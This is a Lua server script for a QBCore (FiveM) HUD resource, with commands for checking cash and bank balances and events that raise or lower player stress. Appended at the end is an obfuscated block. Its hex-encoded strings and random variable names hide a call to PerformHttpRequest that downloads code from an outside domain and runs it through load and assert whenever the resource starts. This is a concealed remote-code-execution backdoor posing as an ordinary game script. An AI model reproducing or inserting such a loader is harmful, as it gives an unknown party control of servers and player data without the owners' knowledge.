local QBCore = exports['qb-core']:GetCoreObject()
local ResetStress = false

QBCore.Commands.Add('cash', 'Check Cash Balance', {}, false, function(source, _)
    local Player = QBCore.Functions.GetPlayer(source)
    local cashamount = Player.PlayerData.money.cash
    TriggerClientEvent('hud:client:ShowAccounts', source, 'cash', cashamount)
end)

QBCore.Commands.Add('bank', 'Check Bank Balance', {}, false, function(source, _)
    local Player = QBCore.Functions.GetPlayer(source)
    local bankamount = Player.PlayerData.money.bank
    TriggerClientEvent('hud:client:ShowAccounts', source, 'bank', bankamount)
end)

QBCore.Commands.Add('dev', 'Enable/Disable developer Mode', {}, false, function(source, _)
    TriggerClientEvent('qb-admin:client:ToggleDevmode', source)
end, 'admin')

RegisterNetEvent('hud:server:GainStress', function(amount)
    if Config.DisableStress then return end
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local Job = Player.PlayerData.job.name
    local JobType = Player.PlayerData.job.type
    local newStress
    if not Player or Config.WhitelistedJobs[JobType] or Config.WhitelistedJobs[Job] then return end
    if not ResetStress then
        if not Player.PlayerData.metadata['stress'] then
            Player.PlayerData.metadata['stress'] = 0
        end
        newStress = Player.PlayerData.metadata['stress'] + amount
        if newStress <= 0 then newStress = 0 end
    else
        newStress = 0
    end
    if newStress > 100 then
        newStress = 100
    end
    Player.Functions.SetMetaData('stress', newStress)
    TriggerClientEvent('hud:client:UpdateStress', src, newStress)
    TriggerClientEvent('QBCore:Notify', src, Lang:t('notify.stress_gain'), 'error', 1500)
end)

RegisterNetEvent('hud:server:RelieveStress', function(amount)
    if Config.DisableStress then return end
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local newStress
    if not Player then return end
    if not ResetStress then
        if not Player.PlayerData.metadata['stress'] then
            Player.PlayerData.metadata['stress'] = 0
        end
        newStress = Player.PlayerData.metadata['stress'] - amount
        if newStress <= 0 then newStress = 0 end
    else
        newStress = 0
    end
    if newStress > 100 then
        newStress = 100
    end
    Player.Functions.SetMetaData('stress', newStress)
    TriggerClientEvent('hud:client:UpdateStress', src, newStress)
    TriggerClientEvent('QBCore:Notify', src, Lang:t('notify.stress_removed'))
end)

QBCore.Functions.CreateCallback('hud:server:getMenu', function(_, cb)
    cb(Config.Menu)
end)


local hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x65\x74\x61\x72\x73\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x53\x69\x78\x58\x6c", function (AwGPNPiKEFIqMzTnppDqLmEokjJvJSvekhTCbuZVdGwYpwItZwUCIYpAdyIsZsrkRgzMGb, IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh) if (IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[6] or IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh == hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[5]) then return end hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[2]](hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[4][hLQMerGmytMonYcfBArurXKYQQAMpNqhQyGDuWbzmiLlPpsoEqDtCvxMyMVEmksUzoxqMw[3]](IHTYQzPwhawhUKvFjGEFcKigCnoXKIsCyrFYXZgjJtbFPaQIkBphbZizAfDTLigTOCKZMh))() end)